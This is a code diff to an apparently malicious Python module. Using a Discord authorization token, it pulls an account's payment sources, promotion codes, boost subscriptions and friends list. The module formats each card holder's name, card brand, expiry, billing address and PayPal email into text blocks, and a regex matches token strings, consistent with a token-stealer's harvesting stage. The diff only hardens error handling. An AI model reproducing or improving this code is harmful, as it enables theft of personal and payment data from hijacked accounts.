@@ -1,11 +1,11 @@
 import os
 from datetime import datetime
+from json import load
 from re import findall
 from typing import Any, Coroutine, Dict, List, Literal, Optional, Union
 
 import aiofiles
 from aiohttp import ClientSession
-from json import load
 
 pattern = r"\b[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\.[A-Za-z0-9_-]+\b"
 BASE_URL = "https://discord.com/"
@@ -140,52 +140,56 @@ async def check_nitro_credit(headers: Dict[Any, Any]) -> tuple[int, int]:
     return dict_credits["classic_credits"], dict_credits["boost_credits"]
 
 
-async def check_payments(headers: Dict[Any, Any]) -> List[str]:
+async def check_payments(headers: Dict[Any, Any]) -> Optional[List[str]]:
+    search_billing = None
     cc_digits = {"american express": "3", "visa": "4", "mastercard": "5"}
     account_cards, card = [], ""
     async with ClientSession(base_url=BASE_URL) as session:
         async with session.get("/api/v10/users/@me/billing/payment-sources", headers=headers) as response:
             if response.status == 200:
                 search_billing = await response.json()
+            elif (await response.json()).get("code") == 40002:
+                return 403
 
-    for grab in search_billing:
-        grab1 = grab["billing_address"]
-        if grab["type"] == 1:
-            cc_brand = grab["brand"]
-            cc_first = cc_digits.get(cc_brand)
-            cc_last = grab["last_4"]
-            cc_month = str(grab["expires_month"])
-            cc_year = str(grab["expires_year"])
-            card = f"""
-Payment Type: Credit card
-Valid: {not grab["invalid"]}
-CC Holder Name: {grab1["name"]}
-CC Brand: {cc_brand.title()}
-CC Number: {''.join(z if (i + 1) % 2 else f'{z} ' for i, z in
-                    enumerate((cc_first if cc_first else '*')
-                              + ('*' * 11) + cc_last))}
-CC Date: {(f'0{cc_month}' if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4]}
-Address 1: {grab1["line_1"]}
-Address 2: {grab1["line_2"] if grab1["line_2"] else ''}
-City: {grab1["city"]}
-Postal code: {grab1["postal_code"]}
-State: {grab1["state"] if grab1["state"] else ''}
-Country: {grab1["country"]}
-Default Payment Method: {grab['default']}\n"""
-        elif grab["type"] == 2:
-            card = f"""
-Payment Type: PayPal
-Valid: {not grab['invalid']}
-PayPal Name: {grab1["name"]}
-PayPal Email: {grab['email']}
-Address 1: {grab1["line_1"]}
-Address 2: {grab1["line_2"] if grab1["line_2"] else ''}
-City: {grab1["city"]}
-Postal code: {grab1["postal_code"]}
-State: {grab1["state"] if grab1["state"] else ''}
-Country: {grab1["country"]}
-Default Payment Method: {grab['default']}\n"""
-        account_cards.append(card)
+    if search_billing:
+        for grab in search_billing:
+            grab1 = grab["billing_address"]
+            if grab["type"] == 1:
+                cc_brand = grab["brand"]
+                cc_first = cc_digits.get(cc_brand)
+                cc_last = grab["last_4"]
+                cc_month = str(grab["expires_month"])
+                cc_year = str(grab["expires_year"])
+                card = f"""
+    Payment Type: Credit card
+    Valid: {not grab["invalid"]}
+    CC Holder Name: {grab1["name"]}
+    CC Brand: {cc_brand.title()}
+    CC Number: {''.join(z if (i + 1) % 2 else f'{z} ' for i, z in
+                        enumerate((cc_first if cc_first else '*')
+                                  + ('*' * 11) + cc_last))}
+    CC Date: {(f'0{cc_month}' if len(cc_month) < 2 else cc_month) + '/' + cc_year[2:4]}
+    Address 1: {grab1["line_1"]}
+    Address 2: {grab1["line_2"] if grab1["line_2"] else ''}
+    City: {grab1["city"]}
+    Postal code: {grab1["postal_code"]}
+    State: {grab1["state"] if grab1["state"] else ''}
+    Country: {grab1["country"]}
+    Default Payment Method: {grab['default']}\n"""
+            elif grab["type"] == 2:
+                card = f"""
+    Payment Type: PayPal
+    Valid: {not grab['invalid']}
+    PayPal Name: {grab1["name"]}
+    PayPal Email: {grab['email']}
+    Address 1: {grab1["line_1"]}
+    Address 2: {grab1["line_2"] if grab1["line_2"] else ''}
+    City: {grab1["city"]}
+    Postal code: {grab1["postal_code"]}
+    State: {grab1["state"] if grab1["state"] else ''}
+    Country: {grab1["country"]}
+    Default Payment Method: {grab['default']}\n"""
+            account_cards.append(card)
 
     return account_cards
 
@@ -251,6 +255,8 @@ async def get_connections(headers: Dict[Any, Any]) -> Dict[Any, Any]:
 
 async def get_promotions(headers: Dict[Any, Any], locale: Optional[str] = None) -> Dict[Any, Any]:
     promo_ = {}
+    res = None
+
     async with ClientSession(base_url=BASE_URL) as session:
         async with session.get(
                 f"/api/v10/users/@me/outbound-promotions/codes?locale={locale if locale else 'us'}",
@@ -259,40 +265,45 @@ async def get_promotions(headers: Dict[Any, Any], locale: Optional[str] = None) 
             if response.status == 200:
                 res = await response.json()
 
-    for result in res:
-        name = result["promotion"]["outbound_title"]
-        start_time = from_iso_format_to_humanly(result["promotion"]["start_date"])
-        end_time = from_iso_format_to_humanly(result["promotion"]["end_date"])
-        link_to = result["promotion"]["outbound_redemption_page_link"]
-        code = result["code"]
+    if res:
+        for result in res:
+            name = result["promotion"]["outbound_title"]
+            start_time = from_iso_format_to_humanly(result["promotion"]["start_date"])
+            end_time = from_iso_format_to_humanly(result["promotion"]["end_date"])
+            link_to = result["promotion"]["outbound_redemption_page_link"]
+            code = result["code"]
 
-        promo_[name] = [start_time, end_time, link_to, code]
+            promo_[name] = [start_time, end_time, link_to, code]
 
     return promo_
 
 
 async def check_boosts(headers: Dict[Any, Any]) -> Dict[Any, Any]:
     boosts = {}
+    info = None
+
     async with ClientSession(base_url=BASE_URL) as session:
         async with session.get("/api/v10/users/@me/guilds/premium/subscription-slots", headers=headers) as response:
-            info = await response.json()
+            if response.status == 200:
+                info = await response.json()
 
-    for boost_info in info:
-        boost_id = boost_info["id"]
-        guild_id, ended = "Unused boost", False
-        subscription_id = boost_info["subscription_id"]
-        if boost_info.get("premium_guild_subscription") is None:
-            boost_status = "Unused (maybe cooldown)"
-        else:
-            guild_id = boost_info["premium_guild_subscription"]["guild_id"]
-            ended = boost_info["premium_guild_subscription"]["ended"]
-            boost_status = "Used"
-        canceled = boost_info["canceled"]
-        cooldown_ends_at = "No cooldown" \
-            if boost_info["cooldown_ends_at"] is None \
-            else from_iso_format_to_humanly(boost_info["cooldown_ends_at"])
+    if info:
+        for boost_info in info:
+            boost_id = boost_info.get("id")
+            guild_id, ended = "Unused boost", False
+            subscription_id = boost_info["subscription_id"]
+            if boost_info.get("premium_guild_subscription") is None:
+                boost_status = "Unused (maybe cooldown)"
+            else:
+                guild_id = boost_info["premium_guild_subscription"]["guild_id"]
+                ended = boost_info["premium_guild_subscription"]["ended"]
+                boost_status = "Used"
+            canceled = boost_info["canceled"]
+            cooldown_ends_at = "No cooldown" \
+                if boost_info["cooldown_ends_at"] is None \
+                else from_iso_format_to_humanly(boost_info["cooldown_ends_at"])
 
-        boosts[boost_id] = [guild_id, ended, boost_status, canceled, cooldown_ends_at, subscription_id]
+            boosts[boost_id] = [guild_id, ended, boost_status, canceled, cooldown_ends_at, subscription_id]
 
     return boosts
 
@@ -319,7 +330,7 @@ async def get_relationships(headers: Dict[Any, Any]) -> tuple[int, List[str]]:
         async with session.get("/api/v10/users/@me/relationships", headers=headers) as resp:
             relationship_json = await resp.json()
 
-    if relationship_json:
+    if relationship_json and relationship_json.get("code") != 40002:
         for friend in relationship_json:
             user_flags = get_user_flags(friend['user']['public_flags'])
             user_id = friend['user']['id']
